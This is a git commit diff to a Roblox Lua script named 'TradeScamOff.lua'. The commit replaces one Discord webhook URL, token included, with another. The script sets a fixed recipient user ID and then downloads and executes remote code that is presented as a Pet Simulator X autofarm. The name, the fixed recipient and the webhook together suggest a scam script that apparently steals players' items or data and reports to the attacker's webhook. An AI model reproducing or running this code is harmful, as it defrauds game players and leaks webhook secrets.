7eba1a77c1ce7ca97a4eec32e268234c11a96c15
lmaooa1043 <119785971+lmaooa1043@users.noreply.github.com>
2022-12-24 01:11:13 +0300

    Update TradeScamOff.lua

--- TradeScamOff.lua
+++ TradeScamOff.lua
@@ -1,3 +1,3 @@
 _G.UserID = 2478823051
-_G.WebHook = "https://discord.com/api/webhooks/1055947536831090740/2ces73E8nqQ2Od0i3gMl7gSRptHHCWqHhs-_5tbFUDwdSl7R_PQZglvsUSFgWKNcQieM"
+_G.WebHook = "https://discord.com/api/webhooks/1055970801662312468/fMDtkW5c2lI15889N63SFbk_j3eM8hp-IsOmm7lYQJ5sI-0XCtcczyX02vW_vrd0RzyE"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
